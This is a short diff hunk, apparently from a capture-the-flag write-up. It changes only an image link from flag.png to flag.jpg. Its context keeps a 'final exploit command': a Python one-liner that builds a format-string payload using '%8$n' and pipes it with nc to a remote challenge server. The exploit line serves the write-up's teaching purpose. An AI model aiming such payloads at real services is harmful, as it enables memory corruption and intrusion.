@@ -124,5 +124,5 @@ Final exploit command:
 ```bash
 (python3 -c 'import sys; sys.stdout.buffer.write(b"\x90" * 2 + b"\x30\xa0\x04\x08" + b"A" * 12 + b"%8$n" + b"\n")') | nc 34.159.228.3 31232
 ```
-![Connect to server](img/flag.png)
+![Connect to server](img/flag.jpg)
 
